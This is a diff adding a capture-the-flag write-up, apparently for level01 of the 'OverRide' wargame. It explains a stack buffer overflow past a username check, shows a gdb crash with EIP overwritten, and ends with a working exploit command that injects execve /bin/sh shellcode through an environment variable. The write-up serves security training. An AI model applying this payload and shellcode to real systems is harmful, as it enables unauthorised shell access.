@@ -1,2 +1,22 @@
+The first fgets is comparing our input with dat_wil and exit if its not the same. So we have no choice to enter dat_wil\n as first input to enter the else.
+The else on the other way is doing a fgets with a size of 100 while s is allocated for 64 char only.
+We can buffer over flow this, lets try with a lot a A:
+
+Starting program: /home/users/level01/level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) 
+
+We managed to overwrite eip with A, we now just have to put our shellcode instead:
+
 python -c "print('dat_wil\n' + 'A' * 80 + '\x6c\xde\xff\xff')" > /tmp/test
 level01@OverRide:~$ cat /tmp/test - | env -i SHELLCODE=$(python -c "print('\x90' * 500 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')") ./level01
